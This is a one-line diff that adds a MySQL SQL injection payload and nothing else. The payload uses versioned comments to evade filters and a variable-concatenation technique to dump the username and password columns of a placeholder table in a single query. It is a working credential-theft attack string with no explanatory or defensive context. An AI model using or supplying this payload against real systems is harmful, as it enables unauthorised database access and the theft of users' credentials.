@@ -1,0 +1,1 @@
+ (/*!50000select*/(@x)from(/*!50000select*/(@x:=0x00),(/*!50000select*/(@x)from(NamaTableDB)where(@x)in(@x:=/*!50000concat*/(0x20,@x,0x3c62723e,username,0x203a3a20,password))))x)
